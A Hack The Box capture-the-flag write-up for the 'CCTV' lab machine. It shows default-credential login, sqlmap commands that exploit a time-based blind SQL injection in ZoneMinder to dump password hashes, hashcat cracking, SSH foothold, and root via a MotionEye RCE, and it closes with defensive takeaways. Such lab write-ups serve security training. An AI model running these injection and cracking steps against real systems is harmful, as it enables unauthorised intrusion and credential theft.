---
title: "CCTV - Hack The Box"
target: "CCTV"
os: "Linux"
difficulty: "Easy"
status: "Pwned"
vectors: "Default Camera API Credentials, Authenticated RCE, Sudo Misconfiguration PrivEsc"
tags:
  - ciber
  - htb
  - webcam
  - default-creds
  - api
  - privesc
synced: "2026-11-02 12:08"
---

<p align="center">
  <img src="https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/a1204fb6-47f1-4555-8cb3-cd3e2f60f587.png" alt="CCTV Avatar" width="220">
</p>

## Operating System: Linux
![[Linux.png|70]]

## Machine Metadata

| Property | Value |
| :--- | :--- |
| **Machine ID** | 847 |
| **Machine Name** | CCTV |
| **IP Address** | N/A |
| **Status** | Pwned |
| **Active on HTB** | ❌ |
| **User Flag** | ✅ |
| **Root Flag** | ✅ |
| **Difficulty** | Easy |
| **Stars** | ⭐️ 3.6 |
| **Created Note** | 2026-10-16 |
| **Release Date** | 2026-03-07 |
| **Tags** | #Web_Application #SQL_Injection #Remote_Code_Execution #Clear_Text_Credentials #Default_Credentials #Weak_Permissions #SQL #Bash #MySQL #Docker #OpenSSH #Linux #Password_Reuse #Password_Cracking #Network_Sniffing #Password_Capture #Common_Applications #Broken_Authentication_and_Authorization #Injections |

<p style="display:none">
id:: 847
active:: False
name:: CCTV
os:: Linux
user_flag:: True
root_flag:: True
difficulty_text:: Easy
stars:: 3.6
created:: 2026-10-16
published:: 2026-03-07
avatar:: https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/a1204fb6-47f1-4555-8cb3-cd3e2f60f587.png
tags:: #Web_Application #SQL_Injection #Remote_Code_Execution #Clear_Text_Credentials #Default_Credentials #Weak_Permissions #SQL #Bash #MySQL #Docker #OpenSSH #Linux #Password_Reuse #Password_Cracking #Network_Sniffing #Password_Capture #Common_Applications #Broken_Authentication_and_Authorization #Injections
</p>

## Statistics

### Radar Matrix
```chartsview
#-----------------#
#- chart type    -#
#-----------------#
type: Radar

#-----------------#
#- chart data    -#
#-----------------#
data:
  - item: "ENUM"
    user: "user"
    score: 5.3
  - item: "REAL"
    user: "user"
    score: 5.4
  - item: "CVE"
    user: "user"
    score: 6.5
  - item: "CUSTOM"
    user: "user"
    score: 3.5
  - item: "CTF"
    user: "user"
    score: 4.6
  - item: "ENUM"
    user: "author"
    score: 0
  - item: "REAL"
    user: "author"
    score: 0
  - item: "CVE"
    user: "author"
    score: 0
  - item: "CUSTOM"
    user: "author"
    score: 0
  - item: "CTF"
    user: "author"
    score: 0

#-----------------#
#- chart options -#
#-----------------#
options:
  xField: "item"
  yField: "score"
  seriesField: "user"
  meta:
    score:
      alias: "Score"
      min: 0
      nice: true
  xAxis:
    line: null
    tickLine: null
  yAxis:
    label: false
    grid:
      alternateColor: "rgba(0, 0, 0, 0.04)"
  point: []
  area: []
```

### Community Difficulty Rating
```chartsview
#-----------------#
#- chart type    -#
#-----------------#
type: Column

#-----------------#
#- chart data    -#
#-----------------#
data:
  - folder: "PIECE OF CAKE"
    count: 526
  - folder: "VERY EASY"
    count: 659
  - folder: "EASY"
    count: 2807
  - folder: "NOT TOO EASY"
    count: 2292
  - folder: "MEDIUM"
    count: 1059
  - folder: "A BIT HARD"
    count: 329
  - folder: "HARD"
    count: 205
  - folder: "EXTREMELY HARD"
    count: 71
  - folder: "INSANE"
    count: 22
  - folder: "BRAINFUCK"
    count: 102

#-----------------#
#- chart options -#
#-----------------#
options:
  xField: "folder"
  yField: "count"
  padding: auto
  label:
    position: "middle"
    style:
      opacity: 0.6
      fontSize: 12
  columnStyle:
    fillOpacity: 0.5
    lineWidth: 1
    strokeOpacity: 0.7
    shadowColor: "grey"
    shadowBlur: 10
    shadowOffsetX: 5
    shadowOffsetY: 5
  xAxis:
    label:
      autoHide: false
      autoRotate: true
  meta:
    count:
      alias: "Votes"
```

---

This write-up covers the path to completely compromising the **CCTV** machine from HackTheBox. The journey involves exploiting a SQL injection vulnerability in ZoneMinder to dump user credentials, cracking a hashed password to gain SSH access, and finally escalating privileges by exploiting a [[Web - Injection - OS Command Injection in API Parameters|command injection]] vulnerability in a locally running MotionEye instance.
## Overview

We start by adding the target IP to our `/etc/hosts` file:

```bash
echo "10.129.16.129 cctv.htb" | sudo tee -a /etc/hosts
```
## Reconnaissance

### Port Scanning

As always, our first step is to perform a port scan using [[Recon - Nmap - Port Scanning and Host Discovery|Nmap]] to identify open services:

```bash
$ nmap -sC -sV -p22,80 cctv.htb
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-07 13:26 +0200
Nmap scan report for cctv.htb (10.129.16.129)
Host is up (0.067s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|_  256 76:1d:73:98:fa:05:f7:0b:04:c2:3b:c4:7d:e6:db:4a (ECDSA)
80/tcp open  http    Apache httpd 2.4.58
|_http-title: SecureVision CCTV & Security Solutions
Service Info: Host: default; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We discover two open ports:
- **22 (SSH):** OpenSSH 9.6p1
- **80 (HTTP):** Apache httpd 2.4.58

### Web Enumeration

Navigating to `http://cctv.htb`, we are greeted by the "SecureVision CCTV & Security Solutions" login page.

![[LoginButton_CCTV.png]]

Testing default credentials, we successfully authenticate with `admin:admin`. 

![[Admin_Page.png]]

Once inside, we identify the application as **ZoneMinder** running version `v1.37.63`. A quick search reveals that this version is vulnerable to an unauthenticated SQL Injection (CVE-2024-51482), documented in [this advisory](https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-qm8h-3xvf-m7j3).

The vulnerable endpoint is:
`http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1`

![[CCTV_vulnerable_endpoint.png]]

## Exploitation (SQL Injection)

The endpoint is vulnerable to [[Web - SQLi - Time-Based Blind Injection|Time-Based Blind SQL Injection]]. Attempting to exploit this endpoint directly with `sqlmap` results in a 401 Unauthorized error because session [[Web - HTTP - Cookies & Session Management|cookies]] are missing:

```bash
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" -p tid
...
[CRITICAL] not authorized, try to provide right HTTP authentication type and valid credentials (401).
```

To bypass this, we capture a valid GET request using Burp Suite and save it to a file named `req.txt`:

```http
GET /zm/index.php?view=request&request=event&action=removetag&tid=1 HTTP/1.1
Host: cctv.htb
Accept-Language: es-ES,es;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: zmSkin=classic; zmCSS=base; zmHeaderFlip=down; ZMSESSID=fbq64tqnhfgejamim0hl0icsli
Connection: keep-alive
```

We then feed this request file to `sqlmap`, forcing a time-based blind injection attack on the `tid` parameter:

```bash
sqlmap -r req.txt -p tid --batch --technique=T
...
Parameter: tid (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: view=request&request=event&action=removetag&tid=1 AND (SELECT 2336 FROM (SELECT(SLEEP(5)))iyui)
```

The attack confirms that the backend is MySQL. We proceed to enumerate the databases:

```bash
sqlmap -r req.txt -p tid --batch --technique=T --dbs
```
We find a database named `zm`. Next, we list its tables and find the `Users` table:

```bash
sqlmap -r req.txt -p tid --batch --technique=T -D zm --tables
```

Finally, we dump the contents of the `Users` table:

```bash
sqlmap -r req.txt -p tid --batch --technique=T --dump -D zm -T Users
```

This yields three users: `superadmin`, `mark`, and `admin`, along with their hashed passwords.

### Cracking the Password & Foothold

We save `mark`'s hash to a file (`hashes.txt`) and crack it using `hashcat` with the `rockyou.txt` wordlist:

```bash
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt --show

$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.:opensesame
```

With the credentials `mark:opensesame`, we connect to the machine via SSH:

```bash
ssh mark@cctv.htb
```

We successfully obtain our initial shell and can read the user flag.

## Privilege Escalation

After gaining initial access, we begin enumerating the system. Checking the `mark` user's permissions, we find they cannot run `sudo`:

```bash
mark@cctv:~$ sudo -l
Sorry, user mark may not run sudo on cctv.
```

Exploring the filesystem, we notice a `MotionEye` directory in `/tmp`. MotionEye is a popular web frontend for the motion daemon, used for video surveillance.

Looking for configuration files, we find them in `/etc/motioneye`:

```bash
mark@cctv:/etc/motioneye$ cat motion.conf
# @admin_username admin
# @normal_username user
# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0
# @lang en
# @enabled on

mark@cctv:/etc/motioneye$ cat motioneye.conf
# the IP address to listen on
listen 127.0.0.1
# the TCP port to listen on
port 8765
```

MotionEye is running locally on port `8765`. We set up local port forwarding to access the web interface from our attacking machine:

```bash
ssh -L 8765:127.0.0.1:8765 mark@cctv.htb
```

Accessing `http://127.0.0.1:8765` in our browser, we use the `admin` account with the password hash we found (which cracked or allowed pass-the-hash/direct login depending on the application logic) to access the dashboard.

The dashboard reveals the version information:
- **motionEye Version:** 0.43.1b4
- **Motion Version:** 4.7.1
- **OS Version:** Ubuntu 24.04

Searching for vulnerabilities related to motionEye `0.43.1b4`, we find an advisory for an authenticated Remote Code Execution (RCE) vulnerability ([GHSA-j945-qm58-4gjx](https://github.com/motioneye-project/motioneye/security/advisories/GHSA-j945-qm58-4gjx)). Since motionEye typically runs with root privileges, this exploit will provide us with a root shell.

By following the public exploit instructions, we successfully trigger a reverse shell back to our attacking machine, landing as `root`:

```bash
Root: 2dcc99c6c91e8cad258589f8cb413926
User: d812bf3525cc2d09d40e86e7a939e42b
```

## Conclusion

The CCTV machine offered a realistic scenario involving an outdated surveillance application (ZoneMinder) vulnerable to SQL injection, highlighting the importance of securing and updating internal monitoring tools. After establishing a foothold via weak, reused passwords, privilege escalation was achieved by discovering an internally bound, vulnerable instance of MotionEye running with elevated privileges.

---

## Post-Engagement & Zettelkasten Notes

### Key Takeaways & Defense
- **ZoneMinder SQL Injection**: Web management portals must validate all parameters and avoid executing dynamic SQL queries directly.
- **Password Reuse**: The credential hash recovered from the database directly matched SSH credentials for user `mark`, emphasizing the danger of password reuse across administrative surfaces.
- **Internal Vulnerabilities**: MotionEye running locally on port 8765 as `root` allowed an authenticated command injection to achieve immediate root privilege escalation.

### Atomic Notes to Extract
- [[Web - SQLi - Time-Based Blind Injection|Time-Based Blind SQL Injection]]
- [[Web - Injection - OS Command Injection in API Parameters|Command Injection in Internal Web Apps]]
- [[Linux - PrivEsc - Password Reuse|Password Reuse from Databases]]
